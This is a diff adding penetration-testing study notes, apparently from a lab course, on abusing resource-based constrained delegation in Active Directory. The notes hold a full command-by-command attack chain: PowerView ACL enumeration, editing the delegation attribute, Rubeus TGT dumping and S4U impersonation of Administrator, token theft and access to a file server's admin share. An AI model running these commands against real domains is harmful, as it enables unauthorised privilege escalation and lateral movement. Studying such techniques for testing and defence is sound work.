@@ -114,3 +114,48 @@ S4U2self computer takeover:
                 /self tells rubeus not to submit S4U2proxy
                 /altservice is the SPN we want substituted into the service ticket
                 /ticket is the TGT
+
+resource-based constrained delegation (RBCD):
+    instead of a front-end service dictating to which back-end services it can delegate to; it's the back-end service that controls which front-end services can delegate to it
+    controlled by defining the front-end service account(s) in the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of the back-end service
+    an admin with these delegated rights can then add RBCD entries
+        e.g. $front = Get-ADComputer -Identity 'lon-ws-1'
+             $back = Get-ADComputer -Identity 'lon-fs-1'
+             Set-ADComputer -Identity $back -PrincipalsAllowedToDelegateToAccount $front
+    an adversay can gain access to any computer via RBCD if:
+        they have write access to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of a computer
+        they have control of another principal that has an SPN
+    write access:
+        search each computer's ACL and print results where AceType = GUID for the msDS-AllowedToActOnBehalfOfOtherIdentity attribute with WriteProperty
+            PS C:\Users\Attacker> ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
+            PS C:\Users\Attacker> $Cred = Get-Credential CONTOSO\rsteel
+            PS C:\Users\Attacker> Get-DomainComputer -Server 10.10.120.1 -Credential $Cred | Get-DomainObjectAcl -Server 10.10.120.1 -Credential $Cred | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -Match 'WriteProperty' } | select ObjectDN,SecurityIdentifier
+        note the SID(s) that are returned from this query and then search through AD to find the associated user/group
+            PS C:\Users\Attacker> Get-ADGroup -Filter 'objectsid -eq "[SID]"' -Server 10.10.120.1 -Credential $Cred
+        the returned user/group can modify the attribute on the specified computers
+    account with an spn:
+        NOTE: this is needed because all delegation can only be configured on accounts that have an SPN
+        we can use other computer accounts that we have elevated SYSTEM privs as they all have a set SPN
+        service accounts can be used if we have obtained their creds (e.g. via kerberoasting)
+        if we have none of the above, we can try to create our own computer object to the domain using tools such as https://github.com/FuzzySecurity/StandIn
+    the attack:
+        once we have both conditions met we can begin the attack
+        list the PrincipalsAllowedToDelegateToAccount attribute for the computer objects:
+            PS C:\Users\Attacker> Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount
+        add a computer we have SYSTEM on, such as lon-wkstn-1:
+            PS C:\Users\Attacker> $ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 10.10.120.1 -Credential $Cred
+            PS C:\Users\Attacker> $wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 10.10.120.1 -Credential $Cred
+            PS C:\Users\Attacker> Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 10.10.120.1 -Credential $Cred
+        verify we added our copmuter:
+            PS C:\Users\Attacker> Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount
+        now gain access to lon-fs-1 by extracting/requesting a TGT:
+            beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
+        now perform s4u attack:
+            beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /nowrap
+        now use the new creds:
+            beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:[TGS]
+            beacon> steal_token [pid]
+            beacon> ls \\lon-fs-1\c$
+        clean up!
+            PS C:\Users\Attacker> Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1 -Server 10.10.120.1 -Credential $Cred
+            PS C:\Users\Attacker> Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount
